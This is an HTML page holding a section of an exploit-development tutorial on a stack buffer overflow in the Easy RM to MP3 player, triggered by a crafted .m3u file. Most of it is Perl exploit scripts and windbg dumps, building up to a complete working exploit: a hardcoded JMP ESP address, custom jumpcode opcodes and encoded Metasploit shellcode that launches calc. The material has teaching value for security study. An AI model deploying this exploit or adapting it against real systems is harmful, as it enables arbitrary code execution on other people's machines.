<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Small Buffers and Custom Jumpcode</title>
</head><body>We have talked about various ways to make EIP jump to our shellcode. In all scenario’s, we have had the luxury to be able to put this shellcode in one piece in the buffer. But what if we see that we don’t have enough space to host the entire shellcode ?<br/>
<br/>
In our exercise, we have been using 26094 bytes before overwriting EIP, and we have noticed that ESP points to 26094+4 bytes, and that we have plenty of space from that point forward. But what if we only had 50 bytes (ESP -&gt; ESP+50 bytes). What if our tests showed that everything that was written after those 50 bytes were not usable ? 50 bytes for hosting shellcode is not a lot. So we need to find a way around that. So perhaps we can use the 26094 bytes that were used to trigger the actual overflow.<br/>
<br/>
First, we need to find these 26094 bytes somewhere in memory. If we cannot find them anywhere, it’s going to be difficult to reference them. In fact, if we can find these bytes and find out that we have another register pointing (or almost pointing) at these bytes, it may even be quite easy to put our shellcode in there.<br/>
<br/>
If you run some basic tests against Easy RM to MP3, you will notice that parts of the 26094 bytes are also visible in the ESP dump :<br/>
<br/>
my $file= &quot;test1.m3u&quot;;<br/>
my $junk= &quot;A&quot; x 26094;<br/>
my $eip = &quot;BBBB&quot;;<br/>
my $preshellcode = &quot;X&quot; x 54; #let's pretend this is the only space we have available<br/>
my $nop = &quot;\x90&quot; x 230; #added some nops to visually separate our 54 X's from other data<br/>
<br/>
open($FILE,&quot;&gt;$file&quot;);<br/>
print $FILE $junk.$eip.$preshellcode.$nop;<br/>
close($FILE);<br/>
print &quot;m3u File Created successfully\n&quot;;<br/>
<br/>
After opening the test1.m3u file, we get this :<br/>
<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715<br/>
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0     nv up ei pl nz na pe nc<br/>
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000       efl=00000206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0x42424231:<br/>
42424242 ??       ???<br/>
0:000&gt; d esp<br/>
000ff730 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX<br/>
000ff740 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX<br/>
000ff750 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX<br/>
000ff760 58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90 XX..............<br/>
000ff770 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff780 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff790 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7a0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
0:000&gt; d<br/>
000ff7b0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7c0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7d0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7e0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7f0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff800 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff810 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff820 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
0:000&gt; d<br/>
000ff830 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff840 90 90 90 90 90 90 90 90-00 41 41 41 41 41 41 41 .........AAAAAAA<br/>
000ff850 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff860 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff870 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff880 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff890 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff8a0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
<br/>
We can see our 50 X’s at ESP. Let’s pretend this is the only space available for shellcode (we think). However, when we look further down the stack, we can find back A’s starting from address 000ff849 (=ESP+281).<br/>
<br/>
When we look at other registers, there’s no trace of X’s or A’s. (You can just dump the registers, or look for a number of A’s in memory.<br/>
<br/>
So this is it. We can jump to ESP to execute some code, but we only have 50 bytes to spend on shellcode. We also see other parts of our buffer at a lower position in the stack… in fact, when we continue to dump the contents of ESP, we have a huge buffer filled with A’s…<br/>
<br/>
Luckily there is a way to host the shellcode in the A’s and use the X’s to jump to the A’s. In order to make this happen, we need a couple of things<br/>
<ul><li>The position inside the buffer with 26094 A’s that is now part of ESP, at 000ff849 (“Where do the A’s shown in ESP really start ?) (so if we want to put our shellcode inside the A’s, we need to know where exactly it needs to be put)</li>
<li>“Jumpcode” : code that will make the jump from the X’s to the A’s. This code cannot be larger than 50 bytes (because that’s all we have available directly at ESP)</li>
</ul>
<br/>
We can find the exact position by using guesswork, by using custom patterns, or by using one of metasploits patterns.<br/>
<br/>
We’ll use one of metasploit’s patterns… we’ll start with a small one (so if we are looking at the start of the A’s, then we would not have to work with large amount of character patterns :-) )<br/>
<br/>
Generate a pattern of let’s say 1000 characters, and replace the first 1000 characters in the perl script with the pattern (and then add 25101 A’s)<br/>
<br/>
<br/>
<br/>
my $file= &quot;test1.m3u&quot;;<br/>
my $pattern = &quot;Aa0Aa1Aa2Aa3Aa4Aa....g8Bg9Bh0Bh1Bh2B&quot;;<br/>
my $junk= &quot;A&quot; x 25101;<br/>
my $eip = &quot;BBBB&quot;;<br/>
my $preshellcode = &quot;X&quot; x 54; #let's pretend this is the only space we have available at ESP<br/>
my $nop = &quot;\x90&quot; x 230; #added some nops to visually separate our 54 X's from other data in the ESP dump<br/>
<br/>
open($FILE,&quot;&gt;$file&quot;);<br/>
print $FILE $pattern.$junk.$eip.$preshellcode.$nop;<br/>
close($FILE);<br/>
print &quot;m3u File Created successfully\n&quot;;<br/>
<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715<br/>
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0     nv up ei pl nz na pe nc<br/>
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000       efl=00000206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0x42424231:<br/>
42424242 ??       ???<br/>
0:000&gt; d esp<br/>
000ff730 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX<br/>
000ff740 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX<br/>
000ff750 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX<br/>
000ff760 58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90 XX..............<br/>
000ff770 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff780 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff790 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7a0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
0:000&gt; d<br/>
000ff7b0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7c0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7d0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7e0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7f0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff800 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff810 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff820 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
0:000&gt; d<br/>
000ff830 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff840 90 90 90 90 90 90 90 90-00 35 41 69 36 41 69 37 .........5Ai6Ai7<br/>
000ff850 41 69 38 41 69 39 41 6a-30 41 6a 31 41 6a 32 41 Ai8Ai9Aj0Aj1Aj2A<br/>
<br/>
What we see at 000ff849 is definitely part of the pattern. The first 4 characters are 5Ai6<br/>
<br/>
Using metasploit pattern_offset utility, we see that these 4 characters are at offset 257. So instead of putting 26094 A’s in the file, we’ll put 257 A’s, then our shellcode, and fill up the rest of the 26094 characters with A’s again. Or even better, we’ll start with only 250 A’s, then 50 NOP’s, then our shellcode, and then fill up the rest with A’s. That way, we don’t have to be very specific when jumping… If we can land in the NOP’s before the shellcode, it will work just fine.<br/>
<br/>
Let’s see how the script and stack look like when we set this up :<br/>
<br/>
my $file= &quot;test1.m3u&quot;;<br/>
my $buffersize = 26094;<br/>
<br/>
my $junk= &quot;A&quot; x 250;<br/>
my $nop = &quot;\x90&quot; x 50;<br/>
my $shellcode = &quot;\xcc&quot;;<br/>
<br/>
my $restofbuffer = &quot;A&quot; x ($buffersize-(length($junk)+length($nop)+length($shellcode)));<br/>
<br/>
my $eip = &quot;BBBB&quot;;<br/>
my $preshellcode = &quot;X&quot; x 54; #let's pretend this is the only space we have available<br/>
my $nop2 = &quot;\x90&quot; x 230; #added some nops to visually separate our 54 X's from other data<br/>
<br/>
my $buffer = $junk.$nop.$shellcode.$restofbuffer;<br/>
<br/>
print &quot;Size of buffer : &quot;.length($buffer).&quot;\n&quot;;<br/>
<br/>
open($FILE,&quot;&gt;$file&quot;);<br/>
print $FILE $buffer.$eip.$preshellcode.$nop2;<br/>
close($FILE);<br/>
print &quot;m3u File Created successfully\n&quot;;<br/>
<br/>
When the application dies, we can see our 50 NOPs starting at 000ff848, followed by the shellcode (0x90 at 000ff874), and then again followed by the A’s. Ok, that looks fine.<br/>
<br/>
(188.c98): Access violation - code c0000005 (!!! second chance !!!)<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715<br/>
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0     nv up ei pl nz na pe nc<br/>
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000       efl=00000206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0x42424231:<br/>
42424242 ??       ???<br/>
0:000&gt; d esp<br/>
000ff730 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX<br/>
000ff740 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX<br/>
000ff750 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX<br/>
000ff760 58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90 XX..............<br/>
000ff770 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff780 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff790 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7a0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
0:000&gt; d<br/>
000ff7b0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7c0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7d0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7e0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff7f0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff800 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff810 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff820 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
0:000&gt; d<br/>
000ff830 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff840 90 90 90 90 90 90 90 90-00 90 90 90 90 90 90 90 ................<br/>
000ff850 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff860 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff870 90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41 .....AAAAAAAAAAA<br/>
<br/>
The second thing we need to do is build our jumpcode that needs to be placed at ESP. The goal of the jumpcode is to jump to ESP+281<br/>
<br/>
Writing jump code is as easy as writing down the required statements in assembly and then translating them to opcode (making sure that we don’t have any null bytes or other restricted characters at the same time) :-)<br/>
<br/>
Jumping to ESP+281 would require : Add 281 to the ESP register, and then perform jump esp. 281 = 119h. Don’t try to add everything in one shot, or you may end up with opcode that contains null bytes.<br/>
<br/>
Since we have some flexibility (due to the NOP’s before our shellcode), we don’t have to be very precise either. As long as we add 281 (or more), it will work. We have 50 bytes for our jumpcode, but that should not be a problem.<br/>
<br/>
Let’s add 0x5e (94) to esp, 3 times. Then do the jump to esp. The assembly commands are :<br/>
<ul><li>add <div style="text-align: justify">esp,0x5e</div></li>
<div style="text-align: justify"><li>add esp,0x5e</li>
<li>add esp,0x5e</li>
</div><li><div style="text-align: justify">jmp es</div>p</li>
</ul>
<br/>
Using windbg, we can get the opcode :<br/>
<br/>
0:014&gt; a<br/>
7c901211 add esp,0x5e<br/>
add esp,0x5e<br/>
7c901214 add esp,0x5e<br/>
add esp,0x5e<br/>
7c901217 add esp,0x5e<br/>
add esp,0x5e<br/>
7c90121a jmp esp<br/>
jmp esp<br/>
7c90121c <br/>
<br/>
0:014&gt; u 7c901211<br/>
ntdll!DbgBreakPoint+0x3:<br/>
7c901211 83c45e     add   esp,5Eh<br/>
7c901214 83c45e     add   esp,5Eh<br/>
7c901217 83c45e     add   esp,5Eh<br/>
7c90121a ffe4      jmp   esp<br/>
<br/>
Ok, so the opcode for the entire jumpcode is 0x83,0xc4,0x5e,0x83,0xc4,0x5e,0x83,0xc4,0x5e,0xff,0xe4<br/>
<br/>
my $file= &quot;test1.m3u&quot;;<br/>
my $buffersize = 26094;<br/>
<br/>
my $junk= &quot;A&quot; x 250;<br/>
my $nop = &quot;\x90&quot; x 50;<br/>
my $shellcode = &quot;\xcc&quot;; #position 300<br/>
<br/>
my $restofbuffer = &quot;A&quot; x ($buffersize-(length($junk)+length($nop)+length($shellcode)));<br/>
<br/>
my $eip = &quot;BBBB&quot;;<br/>
my $preshellcode = &quot;X&quot; x 4;<br/>
my $jumpcode = &quot;\x83\xc4\x5e&quot; .  #add esp,0x5e<br/>
 &quot;\x83\xc4\x5e&quot; .        #add esp,0x5e<br/>
 &quot;\x83\xc4\x5e&quot; .        #add esp,0x5e<br/>
 &quot;\xff\xe4&quot;;          #jmp esp<br/>
<br/>
my $nop2 = &quot;0x90&quot; x 10;  # only used to visually separate<br/>
<br/>
my $buffer = $junk.$nop.$shellcode.$restofbuffer;<br/>
<br/>
print &quot;Size of buffer : &quot;.length($buffer).&quot;\n&quot;;<br/>
<br/>
open($FILE,&quot;&gt;$file&quot;);<br/>
print $FILE $buffer.$eip.$preshellcode.$jumpcode;<br/>
close($FILE);<br/>
print &quot;m3u File Created successfully\n&quot;;<br/>
<br/>
The jumpcode is perfectly placed at ESP. When the shellcode is called, ESP would point into the NOPs (between 00ff842 and 000ff873). Shellcode starts at 000ff874<br/>
<br/>
(45c.f60): Access violation - code c0000005 (!!! second chance !!!)<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006608<br/>
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0     nv up ei pl nz na pe nc<br/>
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000       efl=00000206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0x42424231:<br/>
42424242 ??       ???<br/>
0:000&gt; d esp<br/>
000ff730 83 c4 5e 83 c4 5e 83 c4-5e ff e4 00 01 00 00 00 ..^..^..^.......<br/>
000ff740 30 f7 0f 00 00 00 00 00-41 41 41 41 41 41 41 41 0.......AAAAAAAA<br/>
000ff750 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff760 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff770 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff780 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff790 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff7a0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
0:000&gt; d<br/>
000ff7b0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff7c0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff7d0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff7e0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff7f0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff800 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff810 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff820 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
0:000&gt; d<br/>
000ff830 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff840 41 41 90 90 90 90 90 90-90 90 90 90 90 90 90 90 AA..............<br/>
000ff850 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff860 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff870 90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41 .....AAAAAAAAAAA<br/>
000ff880 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff890 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
<br/>
The last thing we need to do is overwrite EIP with a “jmp esp”. From part 1 of the tutorial, we know that this can be achieved via address 0x01ccf23a<br/>
<br/>
What will happen when the overflow occurs ?<br/>
<ul><li>Real shellcode will be placed in the first part of the string that is sent, and will end up at ESP+300. The real shellcode is prepended with NOP’s to allow the jump to be off a little bit</li>
<li>EIP will be overwritten with 0x01ccf23a (points to a dll, run “JMP ESP”)</li>
<li>The data after overwriting EIP will be overwritten with jump code that adds 282 to ESP and then jumps to that address.</li>
<li>After the payload is sent, EIP will jump to esp. This will triggger the jump code to jump to ESP+282. Nop sled, and shellcode gets executed.</li>
</ul>
<br/>
Let’s try with a break as real shellcode :<br/>
<br/>
my $file= &quot;test1.m3u&quot;;<br/>
my $buffersize = 26094;<br/>
<br/>
my $junk= &quot;A&quot; x 250;<br/>
my $nop = &quot;\x90&quot; x 50;<br/>
my $shellcode = &quot;\xcc&quot;; #position 300<br/>
<br/>
my $restofbuffer = &quot;A&quot; x ($buffersize-(length($junk)+length($nop)+length($shellcode)));<br/>
<br/>
my $eip = pack('V',0x01ccf23a); #jmp esp from MSRMCcodec02.dll<br/>
<br/>
my $preshellcode = &quot;X&quot; x 4;<br/>
my $jumpcode = &quot;\x83\xc4\x5e&quot; .  #add esp,0x5e<br/>
 &quot;\x83\xc4\x5e&quot; .        #add esp,0x5e<br/>
 &quot;\x83\xc4\x5e&quot; .        #add esp,0x5e<br/>
 &quot;\xff\xe4&quot;;          #jmp esp<br/>
<br/>
my $buffer = $junk.$nop.$shellcode.$restofbuffer;<br/>
<br/>
print &quot;Size of buffer : &quot;.length($buffer).&quot;\n&quot;;<br/>
<br/>
open($FILE,&quot;&gt;$file&quot;);<br/>
print $FILE $buffer.$eip.$preshellcode.$jumpcode;<br/>
close($FILE);<br/>
print &quot;m3u File Created successfully\n&quot;;<br/>
<br/>
The generated m3u file will bring us right at our shellcode (which is a break). (EIP = 0x000ff874 = begin of shellcode )<br/>
<br/>
(d5c.c64): Break instruction exception - code 80000003 (!!! second chance !!!)<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006608<br/>
eip=<span style="color: #ff0000">000ff874</span>esp=000ff84a ebp=003440c0 iopl=0     nv up ei pl nz ac po nc<br/>
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000       efl=00000212<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0xff863:<br/>
000ff874 cc       int   3<br/>
0:000&gt; d esp<br/>
000ff84a 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff85a 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff86a 90 90 90 90 90 90 90 90-90 90 <span style="color: #ff0000">cc</span>41 41 41 41 41 ...........AAAAA<br/>
000ff87a 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff88a 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff89a 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff8aa 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff8ba 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
<br/>
Replace the break with some real shellcode (and replace the A’s with NOPs)… (shellcode : excluded characters 0x00, 0xff, 0xac, 0xca)<br/>
<br/>
When you replace the A’s with NOPs, you’ll have more space to jump into, so we can live with jumpcode that only jumps 188 positions further (2 times 5e)<br/>
<br/>
my $file= &quot;test1.m3u&quot;;<br/>
my $buffersize = 26094;<br/>
<br/>
my $junk= &quot;\x90&quot; x 200;<br/>
my $nop = &quot;\x90&quot; x 50;<br/>
<br/>
# windows/exec - 303 bytes<br/>
# http://www.metasploit.com<br/>
# Encoder: x86/alpha_upper<br/>
# EXITFUNC=seh, CMD=calc<br/>
my $shellcode = &quot;\x89\xe2\xd9\xeb\xd9\x72\xf4\x5b\x53\x59\x49\x49\x49\x49&quot; .<br/>
&quot;\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56&quot; .<br/>
&quot;\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41&quot; .<br/>
&quot;\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42&quot; .<br/>
&quot;\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d&quot; .<br/>
&quot;\x38\x51\x54\x45\x50\x43\x30\x45\x50\x4c\x4b\x51\x55\x47&quot; .<br/>
&quot;\x4c\x4c\x4b\x43\x4c\x44\x45\x43\x48\x43\x31\x4a\x4f\x4c&quot; .<br/>
&quot;\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x51\x30\x45\x51\x4a&quot; .<br/>
&quot;\x4b\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x45\x51\x4a\x4e\x46&quot; .<br/>
&quot;\x51\x49\x50\x4a\x39\x4e\x4c\x4b\x34\x49\x50\x44\x34\x45&quot; .<br/>
&quot;\x57\x49\x51\x49\x5a\x44\x4d\x45\x51\x48\x42\x4a\x4b\x4c&quot; .<br/>
&quot;\x34\x47\x4b\x50\x54\x51\x34\x45\x54\x44\x35\x4d\x35\x4c&quot; .<br/>
&quot;\x4b\x51\x4f\x51\x34\x43\x31\x4a\x4b\x42\x46\x4c\x4b\x44&quot; .<br/>
&quot;\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c&quot; .<br/>
&quot;\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4b\x39\x51\x4c\x46&quot; .<br/>
&quot;\x44\x45\x54\x48\x43\x51\x4f\x46\x51\x4c\x36\x43\x50\x50&quot; .<br/>
&quot;\x56\x43\x54\x4c\x4b\x47\x36\x46\x50\x4c\x4b\x47\x30\x44&quot; .<br/>
&quot;\x4c\x4c\x4b\x42\x50\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x44&quot; .<br/>
&quot;\x48\x4d\x59\x4c\x38\x4d\x53\x49\x50\x42\x4a\x46\x30\x45&quot; .<br/>
&quot;\x38\x4c\x30\x4c\x4a\x45\x54\x51\x4f\x42\x48\x4d\x48\x4b&quot; .<br/>
&quot;\x4e\x4d\x5a\x44\x4e\x50\x57\x4b\x4f\x4b\x57\x42\x43\x43&quot; .<br/>
&quot;\x51\x42\x4c\x45\x33\x45\x50\x41\x41&quot;;<br/>
<br/>
my $restofbuffer = &quot;\x90&quot; x ($buffersize-(length($junk)+length($nop)+length($shellcode)));<br/>
<br/>
my $eip = pack('V',0x01ccf23a); #jmp esp from MSRMCcodec02.dll<br/>
<br/>
my $preshellcode = &quot;X&quot; x 4; <br/>
<br/>
my $jumpcode = &quot;\x83\xc4\x5e&quot; .  #add esp,0x5e<br/>
 &quot;\x83\xc4\x5e&quot; .        #add esp,0x5e<br/>
 &quot;\xff\xe4&quot;;          #jmp esp<br/>
<br/>
my $nop2 = &quot;0x90&quot; x 10;  # only used to visually separate<br/>
<br/>
my $buffer = $junk.$nop.$shellcode.$restofbuffer;<br/>
<br/>
print &quot;Size of buffer : &quot;.length($buffer).&quot;\n&quot;;<br/>
<br/>
open($FILE,&quot;&gt;$file&quot;);<br/>
print $FILE $buffer.$eip.$preshellcode.$jumpcode;<br/>
close($FILE);<br/>
print &quot;m3u File Created successfully\n&quot;;<br/>
<br/>
pwned again :-)<br/>
<br/>
<br/>
<br/>
</body></html>